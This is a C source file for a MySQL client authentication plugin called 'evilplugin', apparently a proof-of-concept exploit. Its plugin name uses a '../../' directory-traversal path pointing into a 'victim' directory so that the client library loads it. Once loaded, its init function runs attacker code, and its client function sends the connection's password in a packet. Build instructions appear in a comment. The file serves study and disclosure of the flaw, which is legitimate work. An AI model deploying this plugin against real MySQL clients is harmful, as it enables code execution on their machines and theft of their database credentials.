#include <mysql/client_plugin.h>
#include <mysql.h>
#include <stdio.h>

/*
Ubuntu x86_64:

apt install libmysqlclient-dev
gcc -shared -I /usr/include/mysql/ -o evilplugin.so evilplugin.c
NOTE: the plugin_name MUST BE the full name with the directory traversal!!!

*/

static int evil_init(char * a, size_t b , int c , va_list ds)
{
	printf("\r\n\r\nEVIL FUNCTION CALLED!\r\n\r\n");
	return NULL;
}

static int evilplugin_client(MYSQL_PLUGIN_VIO *vio, MYSQL *mysql)
{
int res;
  res= vio->write_packet(vio, (const unsigned char *) mysql->passwd, strlen(mysql->passwd) + 1);
  return CR_OK;
}

mysql_declare_client_plugin(AUTHENTICATION)
  "../../../../../../../home/victim/Desktop/mysql_so_test/evilplugin",  /* plugin name */
  "Author Name",                        /* author */
  "Any-password authentication plugin", /* description */
  {1,0,0},                              /* version = 1.0.0 */
  "GPL",                                /* license type */
  NULL,                                 /* for internal use */
  evil_init,                                 /* no init function */
  NULL,                                 /* no deinit function */
  NULL,                                 /* no option-handling function */
  evilplugin_client                    /* main function */
mysql_end_client_plugin;

